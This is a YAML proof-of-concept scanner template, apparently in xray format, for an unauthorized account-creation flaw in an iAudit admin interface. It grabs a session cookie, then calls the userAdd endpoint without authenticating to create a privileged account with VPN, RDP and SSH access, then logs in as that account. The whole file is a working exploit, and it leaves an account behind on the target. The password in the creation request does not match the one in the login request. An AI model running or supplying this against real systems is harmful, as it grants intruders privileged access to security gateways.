name: poc-yaml-iaudit-unauthirzed-adduser
binding: 61995782-f95d-45fe-99cc-88422a3f4c57
manual: true
detail:
    author: tosec-iaudit unauthorized function
    vulnerability:
        id: CT-517598
        level: high
    warning: this poc will create a random account when finish scanning
transport: http
set:
    username: randomLowercase(6)
    password: randomLowercase(6)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /admin.php?controller=admin_index&action=login
        expression: response.status == 200
        output:
            search: '"PHPSESSID=(?P<phpsessid>.*;)".submatch(response.headers["Set-Cookie"])'
            phpsessid: search["phpsessid"]
    r1:
        request:
            cache: true
            method: POST
            path: /admin.php?controller=admin_interface&action=userAdd
            headers:
                Content-Type: application/x-www-form-urlencoded
                Cookie: PHPSESSID={{phpsessid}}
            body: sn=123456789&data=%7B%22username%22%3A%22{{username}}%22%2C%22realname%22%3A%22{{username}}%22%2C%22password%22%3A%222{{password}}!8_DW%22%2C%22password2%22%3A%222a!8_DoWb%22%2C%22forceeditpassword%22%3A%22on%22%2C%22groupid%22%3A1%2C%22attribute%22%3A%22%22%2C%22mobilenum%22%3A%22%22%2C%22priv2%22%3A0%2C%22email%22%3A%22%22%2C%22workdepartment%22%3A%22%22%2C%22workcompany%22%3A%22%22%2C%22cacn%22%3A%22%22%2C%22start_time%22%3A%222000-01-01%2000%3A00%3A00%22%2C%22limit_time%22%3A%22%22%2C%22nolimit%22%3A1%2C%22enable%22%3A%22on%22%2C%22sourceip%22%3A%22%22%2C%22sourceipv6%22%3A%22%22%2C%22adou%22%3A%22%22%2C%22addn%22%3A%22%22%2C%22localauth%22%3A1%2C%22authtype%22%3A0%2C%22firstauth%22%3A%22localauth%22%2C%22tranportauth%22%3A2%2C%22webportaltime%22%3A0%2C%22asyncoutpass%22%3A-1%2C%22weixincorpusername%22%3A%22%22%2C%22level%22%3A1%2C%22mgroupid%22%3A0%2C%22vpn%22%3A1%2C%22usbkey%22%3A%22%22%2C%22usbkeystatus%22%3A11%2C%22rdpclipauth_up%22%3A1%2C%22rdpclipauth_down%22%3A1%2C%22rdpdiskauth_up%22%3A1%2C%22rdplocal%22%3A%22on%22%2C%22rdpdisk%22%3A%22*%22%2C%22appclipauth_up%22%3A1%2C%22appclipauth_down%22%3A1%2C%22appdiskauth_up%22%3A1%2C%22sftp%22%3A3%2C%22sshtimeout%22%3A0%2C%22rdptimeout%22%3A0%2C%22default_control%22%3A2%2C%22default_appcontrol%22%3A1%2C%22apphost%22%3A%22on%22%2C%22appserver%22%3A1%2C%22english%22%3A0%2C%22ie_hook_flag%22%3A%22on%22%2C%22sshport%22%3A22%2C%22rdpport%22%3A3389%7D
        expression: response.status == 200 && response.body.bcontains(b"\"result\":1")
    r2:
        request:
            cache: true
            method: POST
            path: /admin.php?controller=admin_index&action=chklogin&ref=
            headers:
                Content-Type: application/x-www-form-urlencoded
                Cookie: PHPSESSID={{phpsessid}}
            body: username={{username}}&authtype=localauth&memberscount=&cacn=&password={{password}}!8_DW&dpassword=&nametype=username&fpdata=&button=%E7%99%BB+%E5%BD%95
        expression: response.status == 200 && response.body.bcontains(b"controller=admin_index")
expression: r0() && r1() && r2()
